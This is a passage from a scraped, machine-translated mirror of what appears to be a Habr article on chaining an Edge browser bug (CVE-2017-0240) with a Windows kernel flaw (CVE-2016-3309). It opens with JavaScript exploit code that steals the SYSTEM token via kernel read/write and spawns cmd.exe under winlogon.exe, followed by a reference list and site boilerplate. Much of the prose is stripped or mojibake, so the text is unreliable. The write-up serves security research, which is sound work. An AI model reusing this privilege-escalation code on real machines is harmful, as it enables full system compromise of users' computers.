winlogon_pid = null; // winlogon.exe -  ,     cmd.exe var winlogon = new CString("winlogon.exe"); var image_name = malloc(16); var system_pid = kernel_read_64(system_eprocess.add( g_config.UniqueProcessIdOffset)); while(!current_eprocess || !winlogon_pid) { var eprocess = kernel_read_64(ActiveProcessLinks).sub( g_config.ActiveProcessLinksOffset); var pid = kernel_read_64(eprocess.add( g_config.UniqueProcessIdOffset)); //        //   Uint64.store( image_name.address, kernel_read_64(eprocess.add(g_config.ImageNameOffset)) ); Uint64.store( image_name.address.add(8), kernel_read_64(eprocess.add(g_config.ImageNameOffset + 8)) ); //   winlogon.exe    if(_stricmp(winlogon, image_name).eq(0)) { winlogon_pid = pid; } if (current_pid.eq(pid)) { current_eprocess = eprocess; } //        ActiveProcessLinks = eprocess.add( g_config.ActiveProcessLinksOffset); } //     var sys_token = kernel_read_64(system_eprocess.add(g_config.TokenOffset)); //          //   winlogon.exe var pi = malloc(24); memset(pi, 0, 24); var si = malloc(104 + 8); memset(si, 0, 104 + 8); Uint32.store(si.address, new Integer(104 + 8)); var args = WString("cmd.exe"); var AttributeListSize = Uint64.Ptr.cast(malloc(8)); InitializeProcThreadAttributeList(0, 1, 0, AttributeListSize); var lpAttributeList = malloc(AttributeListSize[0]); Uint64.store( si.address.add(104), lpAttributeList ); InitializeProcThreadAttributeList(lpAttributeList, 1, 0, AttributeListSize) var winlogon_handle = Uint64.Ptr.cast(malloc(8)); //       kernel_write_64(current_eprocess.add(g_config.TokenOffset), sys_token); /*        AppContainer,       winlogon.exe         winlogon.exe */ winlogon_handle[0] = OpenProcess(PROCESS_ALL_ACCESS, 0, winlogon_pid); UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, winlogon_handle, 8, 0, 0); CreateProcess(0, args, 0, 0, 0, EXTENDED_STARTUPINFO_PRESENT, 0, 0, si, pi);</span></span></code> </pre> <br><p>     : </p><br><p><img src="https://habrastorage.org/webt/r4/4j/lm/r44jlmrlc0reurbxe-rosf1cicu.png" alt="å†³èµ›"></p><br><p>   YouTube    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="></a>  ,     Microsoft Edge. </p><br><h2 id="itog"> æ€»ç»“ </h2><br><p>   : </p><br><ul><li> ,       <code>Edge</code>   <code>Windows</code> ,   13   ,        <code>CVE-2017-0240</code>  ,   .          <code>CVE-2016-3309</code> . </li><li>      <code>JS</code> </li><li>    666    <code>JS</code> </li><li>   :  <code>cmd.exe</code>    <code>SYSTEM</code> ,        </li></ul><br><p>   ,         ,                 .  ,       ,         .        . </p><br><h2 id="materialy">  </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Liu Jin â€” The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Andrew Wesie, Brian Pak â€” 1-Day Browser &amp; Kernel <br> Exploitation</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Natalie Silvanovich â€” The ECMA and the Chakra. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Natalie Silvanovich â€” Your Chakra Is Not Aligned. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="">phoenhex team â€” cve-2018-8629-chakra.js</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Quarkslab â€” Exploiting MS16-145: MS Edge TypedArray.sort Use-After-Free (CVE-2016-7288)</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Exploiting MS16-098 RGNOBJ Integer Overflow on Windows 8.1 x64 bit by abusing GDI objects</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Siberas â€” Kernel Exploitation Case Study â€” "Wild" Pool Overflow on Win10 x64 RS2 (CVE-2016-3309 Reloaded)</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Saif El-Sherei â€” Demystifying Windows Kernel Exploitation by Abusing GDI Objects</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Diego Juarez â€” Abusing GDI for ring0 exploit primitives</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Nicolas A. Economou â€” Abusing GDI for ring0 exploit <br> primitives: Evolution</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">pwn.js</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN455594/">https://habr.com/ru/post/zh-CN455594/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN455584/index.html">å¯¹å…¬å¸å†…éƒ¨åŠ›é‡çš„å®šåˆ¶é‡‡è®¿ï¼šä»é”™è¯¯åˆ°å‘ç°</a></li>
<li><a href="../zh-CN455586/index.html">å¾·å›½æ³¢é¸¿ç¥ç»ä¿¡æ¯ç ”ç©¶æ‰€ï¼ˆINIï¼‰æ‰€é•¿GregorSchÃ¶neræ•™æˆä¸¾åŠçš„æœºå™¨äººæŠ€æœ¯è®²åº§ç³»åˆ—</a></li>
<li><a href="../zh-CN455588/index.html">å¦‚ä½•æ•™è‚²æ‚¨çš„ç¤¾åŒºï¼Œä»¥å…æ‰‹é¼“è·³èˆ</a></li>
<li><a href="../zh-CN455590/index.html">PostgreSQL-8ä¸­çš„MVCCã€‚ å†»ç»“</a></li>
<li><a href="../zh-CN455592/index.html">æ”»å‡»å·¥ä¸šä¼ä¸šçš„ç—…æ¯’å¯¹ç‰©ç†å®‰å…¨æ„æˆå¨èƒ</a></li>
<li><a href="../zh-CN455596/index.html">DevConfX ::ç®¡ç†-ç®€å•çš„ç»ç†æŠ¥å‘Š</a></li>
<li><a href="../zh-CN455598/index.html">ç´§æ€¥å°†Eximå‡çº§åˆ°4.92-å­˜åœ¨ä¸»åŠ¨æ„ŸæŸ“</a></li>
<li><a href="../zh-CN455600/index.html">3DEXPERIENCEå¹³å°æœ‰åŠ©äºåˆ›é€ æœªæ¥çš„å…¬å…±äº¤é€š</a></li>
<li><a href="../zh-CN455602/index.html">è¡Œä¸ºæ¨¡ç³Šå¼•èµ·æµè§ˆå™¨å´©æºƒ</a></li>
<li><a href="../zh-CN455604/index.html">Ansibleç”¨äºç®¡ç†Windowsé…ç½®ã€‚ æˆåŠŸæ•…äº‹</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>